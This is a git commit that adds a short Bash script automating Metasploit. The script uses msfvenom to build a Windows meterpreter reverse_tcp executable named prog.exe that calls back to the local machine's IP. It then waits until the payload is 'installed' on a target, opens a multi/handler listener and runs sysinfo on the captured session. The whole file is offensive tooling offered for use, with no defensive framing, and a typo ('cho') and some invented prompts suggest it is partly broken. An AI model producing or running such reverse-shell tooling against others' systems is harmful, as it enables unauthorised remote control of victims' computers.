bbafe9eea56c7547b7d78fdb6b98e51d2477e927
Emeric Jimenez <64564881+emericjimenez@users.noreply.github.com>
2024-02-25 01:05:34 -0400

    Create 1.bash

---
+++ 1.bash
@@ -0,0 +1,47 @@
+#!/bin/bash
+
+name="prog.exe"
+msfcons="msfconsole"
+use_mh="use multi/handler"
+ip_address=$(hostname -I)
+create_exe="msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip_address -f exe -o $name"
+set_pay="set payload windows/meterpreter/reverse_tcp"
+set_ip="set LHOST $ip_address"
+view_options="show options"
+run="exploit"
+inf="sysinfo"
+
+cho -n "Automated Payload Generation with Bash\n"
+
+expect -c "
+spawn $msfcons
+expect \"Creando: \"
+send \"$create_exe\r\"
+expect \"Use: \"
+expect eof
+"
+clear
+
+echo -n "Press any key when payload is installed\n"
+read -r  key
+
+expect -c "
+spawn $msfcons
+expect \"Use: \"
+send \"$use_mh\r\"
+expect \"set pay: \"
+send \"$set_pay\r\"
+expect \"set ip: \"
+send \"$set_ip\r\"
+expect \"view: \"
+send \"$view_options\r\"
+expect \"run: \"
+send \"$run\r\"
+expect \"inf: \"
+send \"$inf\r\"
+expect \"inf: \"
+send \"$inf\r\"
+expect eof
+"
+ 
+echo "Exit."
